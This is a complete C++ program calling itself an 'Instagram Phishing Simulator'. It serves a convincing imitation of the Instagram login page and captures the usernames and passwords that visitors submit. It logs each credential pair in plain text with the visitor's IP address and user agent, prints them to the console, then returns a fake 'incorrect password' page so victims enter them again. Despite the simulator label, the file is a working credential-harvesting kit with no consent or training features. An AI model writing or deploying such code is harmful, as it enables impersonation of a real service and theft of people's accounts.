#include <iostream>
#include <string>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fstream>
#include <sstream>
#include <vector>
#include <map>
#include <ctime>
#include <iomanip>
#include <algorithm>
#include <regex>

#define PORT 8080
#define BUFFER_SIZE 4096

class PhishingSimulator {
private:
    int server_fd;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    
    std::string get_current_time() {
        time_t now = time(0);
        char* dt = ctime(&now);
        std::string time_str(dt);
        time_str.pop_back();
        return time_str;
    }
    
    void log_attempt(const std::string& ip, const std::string& username, const std::string& password, const std::string& user_agent) {
        std::ofstream log_file("phishing_simulator.log", std::ios::app);
        if (log_file.is_open()) {
            log_file << "[" << get_current_time() << "] ";
            log_file << "IP: " << ip << " ";
            log_file << "User: " << username << " ";
            log_file << "Pass: " << password << " ";
            log_file << "UA: " << user_agent << std::endl;
            log_file.close();
            
            std::cout << "\n\033[1;31m[!] PHISHING ATTEMPT DETECTED\033[0m" << std::endl;
            std::cout << "\033[1;33m[!] Time: \033[0m" << get_current_time() << std::endl;
            std::cout << "\033[1;33m[!] Source IP: \033[0m" << ip << std::endl;
            std::cout << "\033[1;32m[!] Username: \033[0m" << username << std::endl;
            std::cout << "\033[1;31m[!] Password: \033[0m" << password << std::endl;
            std::cout << "\033[1;34m[!] User Agent: \033[0m" << user_agent << std::endl;
            std::cout << "----------------------------------------" << std::endl;
        }
    }
    
    std::string extract_user_agent(const std::string& request) {
        size_t pos = request.find("User-Agent: ");
        if (pos != std::string::npos) {
            size_t end = request.find("\r\n", pos);
            if (end != std::string::npos) {
                return request.substr(pos + 12, end - (pos + 12));
            }
        }
        return "Unknown";
    }
    
    std::string create_phishing_page() {
        return R"DELIMITER(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Instagram • Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 1.5rem;
        }

        .login-container {
            max-width: 350px;
            width: 100%;
            margin: 0 auto;
        }

        .card {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 2rem 2rem 1.5rem;
            margin-bottom: 10px;
        }

        .logo {
            text-align: center;
            margin-bottom: 2rem;
        }
        .logo i {
            font-size: 3.5rem;
            background: radial-gradient(circle at 30% 110%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .logo h1 {
            font-family: 'Inter', cursive;
            font-weight: 600;
            font-size: 2rem;
            letter-spacing: -0.5px;
            margin-top: 5px;
            background: linear-gradient(135deg, #262626, #4e4e4e);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .input-group {
            margin-bottom: 6px;
        }
        .input-icon {
            position: relative;
            width: 100%;
        }
        .input-icon i {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #8e8e8e;
            font-size: 1rem;
            z-index: 2;
        }
        .input-icon input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 12px 9px 38px;
            font-size: 0.8rem;
            font-family: inherit;
            transition: all 0.1s ease;
            outline: none;
            color: #262626;
        }
        .input-icon input:focus {
            border-color: #a8a8a8;
            background: #ffffff;
        }
        .input-icon input::placeholder {
            color: #8e8e8e;
            font-weight: 300;
        }

        .login-btn {
            background-color: #0095f6;
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: 600;
            font-size: 0.9rem;
            padding: 7px 16px;
            width: 100%;
            margin-top: 12px;
            cursor: pointer;
            transition: background 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }
        .login-btn:hover {
            background-color: #1877f2;
        }
        .login-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 1.2rem 0;
            color: #8e8e8e;
            font-size: 0.75rem;
            font-weight: 500;
        }
        .divider-line {
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .divider-text {
            margin: 0 18px;
        }

        .fb-login {
            text-align: center;
            margin-bottom: 0.8rem;
        }
        .fb-login a {
            text-decoration: none;
            font-size: 0.85rem;
            font-weight: 600;
            color: #385185;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        .forgot-pw {
            text-align: center;
            font-size: 0.75rem;
        }
        .forgot-pw a {
            color: #00376b;
            text-decoration: none;
        }

        .signup-card {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 1.4rem;
            text-align: center;
            font-size: 0.85rem;
        }
        .signup-card a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .app-badges {
            text-align: center;
            margin-top: 1.2rem;
        }
        .app-badges p {
            font-size: 0.75rem;
            color: #262626;
            margin-bottom: 10px;
        }
        .badges {
            display: flex;
            gap: 8px;
            justify-content: center;
        }
        .badges i {
            font-size: 2rem;
            color: #262626;
        }

        .toast-notify {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: #262626e6;
            backdrop-filter: blur(10px);
            border-radius: 40px;
            padding: 10px 22px;
            color: white;
            font-size: 0.8rem;
            font-weight: 500;
            z-index: 2000;
            display: flex;
            align-items: center;
            gap: 10px;
            animation: fadeUp 0.2s ease;
            white-space: nowrap;
        }
        
        @keyframes fadeUp {
            from { opacity: 0; transform: translateX(-50%) translateY(20px);}
            to { opacity: 1; transform: translateX(-50%) translateY(0);}
        }

        @media (max-width: 450px) {
            body {
                padding: 0.8rem;
            }
            .card {
                padding: 1.5rem;
            }
        }
    </style>
</head>
<body>

<div class="login-container">
    <div class="card">
        <div class="logo">
            <i class="fab fa-instagram"></i>
            <h1>Instagram</h1>
        </div>

        <!-- IMPORTANT: Form submits normally to C++ server -->
        <form action="/login" method="POST" id="instagramLoginForm">
            <div class="input-group">
                <div class="input-icon">
                    <i class="fas fa-user"></i>
                    <input type="text" name="username" id="username" placeholder="Phone number, username, or email" autocomplete="off" required>
                </div>
            </div>
            <div class="input-group">
                <div class="input-icon">
                    <i class="fas fa-lock"></i>
                    <input type="password" name="password" id="password" placeholder="Password" autocomplete="off" required>
                </div>
            </div>
            <button type="submit" class="login-btn" id="loginBtn">
                <i class="fas fa-sign-in-alt"></i> Log in
            </button>
        </form>

        <div class="divider">
            <div class="divider-line"></div>
            <div class="divider-text">OR</div>
            <div class="divider-line"></div>
        </div>

        <div class="fb-login">
            <a href="#" id="fakeFbLink">
                <i class="fab fa-facebook-square"></i> Log in with Facebook
            </a>
        </div>
        <div class="forgot-pw">
            <a href="#">Forgot password?</a>
        </div>
    </div>

    <div class="signup-card">
        Don't have an account? <a href="#">Sign up</a>
    </div>

    <div class="app-badges">
        <p>Get the app.</p>
        <div class="badges">
            <i class="fab fa-apple"></i>
            <i class="fab fa-google-play"></i>
        </div>
    </div>
</div>

<script>
    // Simple visual feedback without blocking form submission
    const form = document.getElementById('instagramLoginForm');
    const loginBtn = document.getElementById('loginBtn');
    
    // Handle fake links (Facebook, Forgot password, Sign up)
    document.getElementById('fakeFbLink')?.addEventListener('click', (e) => {
        e.preventDefault();
        showToast('Connect with Facebook to continue', false);
    });
    
    document.querySelectorAll('.forgot-pw a, .signup-card a').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            showToast('Demo mode: Simulated environment', false);
        });
    });
    
    function showToast(message, isError = false) {
        const existing = document.querySelector('.toast-notify');
        if (existing) existing.remove();
        const toast = document.createElement('div');
        toast.className = 'toast-notify';
        toast.style.background = isError ? '#ed4956e6' : '#262626e6';
        toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-circle' : 'fa-info-circle'}"></i> ${message}`;
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 3000);
    }
    
    // Show loading state when form submits
    form.addEventListener('submit', function() {
        loginBtn.disabled = true;
        loginBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Logging in...';
    });
</script>
</body>
</html>
)DELIMITER";
    }
    
    void send_response(int client_socket, const std::string& response) {
        send(client_socket, response.c_str(), response.length(), 0);
    }
    
    std::string extract_post_data(const std::string& request) {
        size_t body_start = request.find("\r\n\r\n");
        if (body_start != std::string::npos) {
            return request.substr(body_start + 4);
        }
        return "";
    }
    
    void parse_credentials(const std::string& post_data, std::string& username, std::string& password) {
        std::stringstream ss(post_data);
        std::string item;
        
        while (std::getline(ss, item, '&')) {
            size_t eq_pos = item.find('=');
            if (eq_pos != std::string::npos) {
                std::string key = item.substr(0, eq_pos);
                std::string value = item.substr(eq_pos + 1);
                
                // URL decode
                for (size_t i = 0; i < value.length(); i++) {
                    if (value[i] == '+') value[i] = ' ';
                    if (value[i] == '%' && i + 2 < value.length()) {
                        std::string hex = value.substr(i + 1, 2);
                        char decoded = strtol(hex.c_str(), nullptr, 16);
                        value[i] = decoded;
                        value.erase(i + 1, 2);
                    }
                }
                
                if (key == "username") username = value;
                if (key == "password") password = value;
            }
        }
    }

public:
    void start() {
        if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
            perror("Socket failed");
            exit(EXIT_FAILURE);
        }
        
        if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
            perror("setsockopt");
            exit(EXIT_FAILURE);
        }
        
        address.sin_family = AF_INET;
        address.sin_addr.s_addr = INADDR_ANY;
        address.sin_port = htons(PORT);
        
        if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
            perror("Bind failed");
            exit(EXIT_FAILURE);
        }
        
        if (listen(server_fd, 10) < 0) {
            perror("Listen");
            exit(EXIT_FAILURE);
        }
        
        std::cout << "\033[2J\033[1;1H";
        std::cout << "\033[1;35m";
        std::cout << "\n";
        std::cout << "╔════════════════════════════════════════════╗\n";
        std::cout << "║     Instagram Phishing Simulator v3.0     ║\n";
        std::cout << "╚════════════════════════════════════════════╝\n";
        std::cout << "\033[0m";
        std::cout << "\n\033[1;32m[+] Server Status: RUNNING\033[0m" << std::endl;
        std::cout << "\033[1;34m[+] Port: \033[0m" << PORT << std::endl;
        std::cout << "\033[1;34m[+] Local Access: \033[0mhttp://localhost:" << PORT << std::endl;
        std::cout << "\033[1;34m[+] Log File: \033[0mphishing_simulator.log" << std::endl;
        std::cout << "\033[1;33m[+] Press Ctrl+C to stop the server\033[0m" << std::endl;
        std::cout << "\n============================================\n" << std::endl;
        
        while (true) {
            int client_socket = accept(server_fd, (struct sockaddr*)&address, (socklen_t*)&addrlen);
            if (client_socket < 0) {
                perror("Accept");
                continue;
            }
            
            char buffer[BUFFER_SIZE] = {0};
            read(client_socket, buffer, BUFFER_SIZE);
            std::string request(buffer);
            
            // Debug: Print raw request to console
            std::cout << "\033[1;90m[DEBUG] Request received\033[0m" << std::endl;
            
            if (request.find("POST /login") != std::string::npos) {
                std::string post_data = extract_post_data(request);
                std::cout << "\033[1;90m[DEBUG] POST Data: \033[0m" << post_data << std::endl;
                
                std::string username, password;
                parse_credentials(post_data, username, password);
                
                std::string client_ip = inet_ntoa(address.sin_addr);
                std::string user_agent = extract_user_agent(request);
                log_attempt(client_ip, username, password, user_agent);
                
                // Return error page (standard Instagram style)
                std::string response = "HTTP/1.1 200 OK\r\n";
                response += "Content-Type: text/html\r\n";
                response += "Connection: close\r\n\r\n";
                response += R"ERRORPAGE(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Login Error</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .error-container {
            max-width: 380px;
            width: 100%;
        }
        .error-card {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px;
            text-align: center;
        }
        .error-icon {
            font-size: 64px;
            margin-bottom: 20px;
        }
        h2 {
            color: #ed4956;
            font-size: 20px;
            margin-bottom: 10px;
        }
        .error-message {
            color: #262626;
            font-size: 14px;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .back-button {
            display: inline-block;
            padding: 8px 24px;
            background-color: #0095f6;
            color: white;
            text-decoration: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
        }
        .back-button:hover {
            background-color: #1877f2;
        }
    </style>
</head>
<body>
    <div class="error-container">
        <div class="error-card">
            <div class="error-icon">🔒</div>
            <h2>Login Failed</h2>
            <div class="error-message">
                Sorry, your password was incorrect.<br>
                Please double-check your password.
            </div>
            <a href="/" class="back-button">Try Again</a>
        </div>
    </div>
</body>
</html>
)ERRORPAGE";
                send_response(client_socket, response);
            } 
            else {
                std::string response = "HTTP/1.1 200 OK\r\n";
                response += "Content-Type: text/html\r\n";
                response += "Connection: close\r\n\r\n";
                response += create_phishing_page();
                send_response(client_socket, response);
            }
            
            close(client_socket);
        }
    }
};

int main() {
    PhishingSimulator simulator;
    
    try {
        simulator.start();
    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
    
    return 0;
}